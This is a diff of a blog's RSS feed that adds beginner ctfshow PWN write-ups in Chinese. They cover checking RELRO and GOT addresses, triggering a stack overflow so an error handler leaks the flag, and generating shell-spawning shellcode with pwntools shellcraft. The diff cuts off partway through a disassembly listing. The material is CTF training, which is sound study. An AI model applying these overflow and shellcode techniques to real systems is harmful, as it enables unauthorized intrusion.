@@ -7,16 +7,16 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Expl0rer.Ct</copyright>
-        <lastBuildDate>Thu, 28 Aug 2025 13:54:15 +0000</lastBuildDate><atom:link href="https://expl0rer.top/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 29 Aug 2025 12:56:46 +0000</lastBuildDate><atom:link href="https://expl0rer.top/post/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>ctfshow-pwn-writeup</title>
         <link>https://expl0rer.top/p/ctfshow-pwn-writeup/</link>
         <pubDate>Wed, 27 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>https://expl0rer.top/p/ctfshow-pwn-writeup/</guid>
         <description>&lt;img src="https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png" alt="Featured image of post ctfshow-pwn-writeup" /&gt;&lt;p&gt;[TOC]&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;前文：以下是我&lt;a class=&#34;link&#34; href=&#34;https://ctf.show/challenges&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;ctfshow&lt;/a&gt;的PWN做题记录，欢迎各位前来观看，小弟领教！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;前文：每题我都放了链接，供下载，要靶场的题不能做，PWN_005 &lt;del&gt;PWN_016，PWN_20~~PWN_022，PWN_026&lt;/del&gt;PWN_029不需要靶场是可以做的，供大家食用PWN。&lt;/p&gt;
+&lt;p&gt;**前文：以下是我&lt;a class=&#34;link&#34; href=&#34;https://ctf.show/challenges&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ctfshow&lt;/a&gt;的PWN做题记录，欢迎各位前来观看，小弟领教！**还有就是ctfshow-pwn是我入门PWN的第一套题，比较基础，看官方writeup可以知道比较简洁，但有些我看不懂，这是我自己做的过程中写的，都是发自内心理解它们的话，有些可能比较啰嗦，但也必须这样，因为站在新手角度来看必须要这种啰嗦方式去理解才能更深刻，有耐心的朋友可以一直看下去，当然也欢迎PWN大佬前来挑战我！！！😄&lt;/p&gt;
+&lt;p&gt;前文：每题我都放了链接，供下载，要靶场的题不能做，PWN_005&amp;ndash;PWN_016，PWN_20&amp;ndash;PWN_022，PWN_026&amp;ndash;PWN_029不需要靶场是可以做的，供大家食用PWN。&lt;/p&gt;
 &lt;h2 id=&#34;test_your_nc&#34;&gt;Test_your_nc
 &lt;/h2&gt;&lt;h3 id=&#34;pwn_000&#34;&gt;PWN_000
 &lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -1214,6 +1214,797 @@
 &lt;p&gt;如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_020&#34; &gt;PWN_020&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
+&lt;p&gt;checksec一下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/50.png&#34;
+	width=&#34;600&#34;
+	height=&#34;155&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/50_hu_5395d84a6ce1faca.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/50_hu_d78e65288b53f8ce.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;387&#34;
+		data-flex-basis=&#34;929px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在这里只开了NX保护。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/51.png&#34;
+	width=&#34;755&#34;
+	height=&#34;264&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/51_hu_ec1407a9bbbb57d8.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/51_hu_5eec920743e7e000.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Hint提示：什么是RETRO保护&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;285&#34;
+		data-flex-basis=&#34;686px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#relro&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PWN-1的Linux安全防护机制&lt;/a&gt;这一章的学习中，我们有认识到RELRO这个保护。很显然no RELRO意味着.got和.got.plt表都可写。&lt;/p&gt;
+&lt;p&gt;用指令查表地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readelf -S PWN_020
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/52.png&#34;
+	width=&#34;1044&#34;
+	height=&#34;630&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/52_hu_9e02d9e9ca78633b.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/52_hu_cfc6139e4ad6cdf.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;397px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;耐心找一下就找到了，故flag:ctfshow{1_1_0x600f18_0x600f28}&lt;/p&gt;
+&lt;h3 id=&#34;pwn_021&#34;&gt;PWN_021
+&lt;/h3&gt;&lt;p&gt;题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}&lt;/p&gt;
+&lt;p&gt;例如 .got可写.got.plt表可写其地址为0x400820 0x8208820&lt;/p&gt;
+&lt;p&gt;最终flag为ctfshow{1_1_0x400820_0x8208820}&lt;/p&gt;
+&lt;p&gt;若某个表不存在，则无需写其对应地址&lt;/p&gt;
+&lt;p&gt;如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_021&#34; &gt;PWN_021&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;checksec一下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/53.png&#34;
+	width=&#34;1215&#34;
+	height=&#34;610&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/53_hu_8be2513129fe3dd3.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/53_hu_b1f2d1e70b5f95ba.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;partial Relro保护&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;199&#34;
+		data-flex-basis=&#34;478px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;要还不记得Relro保护机制原理的就回PWN-1去看吧&amp;hellip;&lt;/p&gt;
+&lt;p&gt;这里是 GOT 表的前半部分（.got.plt）设置为只读，后半部分（.got）仍可写。&lt;/p&gt;
+&lt;p&gt;用readelf命令去爱看表地址就好了：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/54.png&#34;
+	width=&#34;670&#34;
+	height=&#34;114&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/54_hu_8d769b287fb3ac64.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/54_hu_3cbf63d5305f0ffc.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;587&#34;
+		data-flex-basis=&#34;1410px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;flag:ctfshow{0_1_0x600ff0_0x601000}&lt;/p&gt;
+&lt;h3 id=&#34;pwn_021-1&#34;&gt;PWN_021
+&lt;/h3&gt;&lt;p&gt;题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}&lt;/p&gt;
+&lt;p&gt;例如 .got可写.got.plt表可写其地址为0x400820 0x8208820&lt;/p&gt;
+&lt;p&gt;最终flag为ctfshow{1_1_0x400820_0x8208820}&lt;/p&gt;
+&lt;p&gt;若某个表不存在，则无需写其对应地址&lt;/p&gt;
+&lt;p&gt;如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_021&#34; &gt;PWN_021&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;道理一样checksec看relro的保护、readelf看表&amp;hellip;..&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/55.png&#34;
+	width=&#34;725&#34;
+	height=&#34;153&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/55_hu_4f21e41ae9717f96.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/55_hu_9ef604a41c7706ab.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;.got、.got.plt表都不可写&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;473&#34;
+		data-flex-basis=&#34;1137px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/56.png&#34;
+	width=&#34;705&#34;
+	height=&#34;101&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/56_hu_fd84664444ae0205.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/56_hu_beb3fc8924561d37.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;698&#34;
+		data-flex-basis=&#34;1675px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这次就只有一个.got表了，那就是flag：ctfshow{0_0_0x600fc0}&lt;/p&gt;
+&lt;h3 id=&#34;pwn_023&#34;&gt;PWN_023
+&lt;/h3&gt;&lt;p&gt;题目：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh ctfshow@题目地址 -p题目端口号
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;不是nc连接&lt;/strong&gt;   &lt;a class=&#34;link&#34; href=&#34;PWN_023&#34; &gt;PWN_023&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/57.png&#34;
+	width=&#34;695&#34;
+	height=&#34;140&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/57_hu_55b6f42bf446c46b.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/57_hu_a8dd5de87eab3f4f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;checksec一下&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;496&#34;
+		data-flex-basis=&#34;1191px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没有canary保护，这可以是个突破点：栈溢出漏洞。&lt;/p&gt;
+&lt;p&gt;看回IDA：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/58.png&#34;
+	width=&#34;1060&#34;
+	height=&#34;615&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/58_hu_803795aedfc75284.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/58_hu_31f0d9d5938f057f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;172&#34;
+		data-flex-basis=&#34;413px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;跟进ctfshow函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/59.png&#34;
+	width=&#34;669&#34;
+	height=&#34;159&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/59_hu_14eb223bc3e77877.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/59_hu_99cf8a4061518c1e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;420&#34;
+		data-flex-basis=&#34;1009px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以知道，一开始dgets函数读取flag字符串到内存中&lt;/p&gt;
+&lt;p&gt;跟进signal函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/60.png&#34;
+	width=&#34;529&#34;
+	height=&#34;139&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/60_hu_e4f58d85598c5ca3.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/60_hu_e7413abc36f52d2b.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;380&#34;
+		data-flex-basis=&#34;913px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这行代码会将内存中存储的 &lt;code&gt;flag&lt;/code&gt; 字符串，输出到标准错误流（&lt;code&gt;stderr&lt;/code&gt;）。因为程序启动时已经通过 &lt;code&gt;fgets&lt;/code&gt; 从 &lt;code&gt;/ctfshow_flag&lt;/code&gt; 文件读取了 flag 内容到 &lt;code&gt;flag&lt;/code&gt; 变量中，所以这里能直接打印出正确的 flag。&lt;/p&gt;
+&lt;p&gt;所以说我们让程序报错也就是让它栈溢出，覆盖后的地址还不能是有效地址，让它全部报错，也就是我们可以输入好多个a就行，几十个a的16进制地址是无效地址。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/61.png&#34;
+	width=&#34;945&#34;
+	height=&#34;394&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/61_hu_dbfd74188df09469.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/61_hu_a8d8dd6c093b2cde.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;239&#34;
+		data-flex-basis=&#34;575px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;关于栈溢出这部分，请看&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PWN-2&lt;/a&gt;详细学习，PWN板块占比也是重要的。&lt;/p&gt;
+&lt;p&gt;逐渐开始上强度了，这时需要仔细看IDA的代码分析了，看看是什么工作原理。&lt;/p&gt;
+&lt;p&gt;flag：ctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}&lt;/p&gt;
+&lt;h3 id=&#34;pwn_024&#34;&gt;PWN_024
+&lt;/h3&gt;&lt;h4 id=&#34;题目&#34;&gt;题目：
+&lt;/h4&gt;&lt;p&gt;你可以使用&lt;code&gt;pwntools&lt;/code&gt;的&lt;code&gt;shellcraft&lt;/code&gt;模块来进行攻击&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_024&#34; &gt;PWN_024&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;我来介绍一下shellcraft模块：它是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode（这里的不同体系是我们之前学过的&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/%e7%bd%91%e5%ae%89%e5%ad%a6%e4%b9%a0%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5/#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;操作系统基础的有关shell的那一章节&lt;/a&gt;）有zsh、bash等。Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的Shellcode。&lt;/p&gt;
+&lt;p&gt;生成的汇编代码可直接通过 asm() 函数转换为机器码（二进制），无需手动处理格式，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i386&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 一步完成“汇编模板→机器码”转换，类似C语言的编译器功能，转换成机器语言。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;IDA：可以看到这题似乎和ret2shellcode有关&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/63.png&#34;
+	width=&#34;1045&#34;
+	height=&#34;415&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/63_hu_8320440ce8e9ad20.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/63_hu_f063bc9aa051b388.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;251&#34;
+		data-flex-basis=&#34;604px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看题目提示，进入新大陆了&amp;hellip;用pwntools了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/64.png&#34;
+	width=&#34;710&#34;
+	height=&#34;295&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/64_hu_2df4fc228f333ed2.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/64_hu_ff2fcff08e5e36b.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;240&#34;
+		data-flex-basis=&#34;577px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里有提示，可以看一下&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#nx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PWN-1-NX保护&lt;/a&gt;，有啥启发？&lt;/p&gt;
+&lt;p&gt;在IDA分析可知，ctfshow函数无法跟进源代码，只能看它的伪代码去分析了（比较长）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; Attributes: bp-based frame&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; int __cdecl ctfshow(_DWORD)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;proc&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;near&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; CODE XREF: main+132↓p&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;             &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;88h&lt;/span&gt;
